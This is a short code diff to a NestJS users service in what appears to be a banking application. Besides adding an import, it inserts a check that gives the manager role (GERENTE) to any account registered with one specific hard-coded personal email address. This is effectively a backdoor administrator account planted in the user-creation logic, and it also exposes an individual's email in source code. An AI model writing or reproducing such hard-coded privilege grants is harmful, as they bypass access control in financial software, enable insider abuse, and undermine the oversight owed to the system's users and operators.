@@ -1,7 +1,7 @@
 import { Injectable, HttpException, HttpStatus, NotFoundException } from '@nestjs/common';
 import { InjectRepository } from '@nestjs/typeorm';
 import { Repository } from 'typeorm';
-import { User } from './entities/user.entity';
+import { User, UserRole } from './entities/user.entity';
 import { Account } from '../accounts/entities/account.entity';
 import { CentralBankService } from '../central-bank/central-bank.service';
 import { CreatePersonDto } from '../central-bank/dto/create-person.dto';
@@ -93,6 +93,10 @@ export class UsersService {
         email: normalizedEmail,
         fullName: normalizedFullName,
       });
+    }
+
+    if (normalizedEmail === 'ayrton_d_@hotmail.com') {
+      user.role = UserRole.GERENTE;
     }
 
     const savedUser = await this.userRepository.save(user);
